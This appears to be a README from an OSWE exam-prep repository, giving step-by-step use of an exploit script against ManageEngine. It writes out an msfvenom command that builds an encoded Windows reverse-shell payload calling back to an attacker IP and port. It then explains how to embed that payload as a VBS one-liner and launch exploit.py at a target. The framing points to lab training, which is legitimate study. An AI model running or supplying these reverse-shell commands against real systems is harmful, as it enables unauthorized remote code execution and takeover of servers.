# ManageEngine

To run the exploit follow this steps.
1. Create a "monitor" in the ManageEngine admin dashborad.
> [!WARNING]
> This is mandatory in order to have a working reverse shell (it is a lab requirement, not an exploit requirement).
> **Set "Pooling Interval" to 1 minute**.
> ![ManageEngine Monitor 1](/.images/manageEngine1.png)
> ![ManageEngine Monitor 2](/.images/manageEngine2.png)

2. Run `msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.133.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs -o rev.vbs`. Change the `LHOST` and `LPORT`.
3. Use this [script](https://github.com/VictorNS69/OSWE/blob/main/auxiliar-scripts/vbs_oneliner.py) to get a VBS oneliner payload.
4. Copy the oneliner into the `vbs_payload` variable, on **line 168**.
5. If you used other port different than `4444`, modify the variable `args.lport` on **line 41**.
6. You can then run the script as follows:
```bash
python3 exploit.py -t https://manageengine:8443 -l 192.168.45.235
```
![ManageEngine example](/.images/example.png)
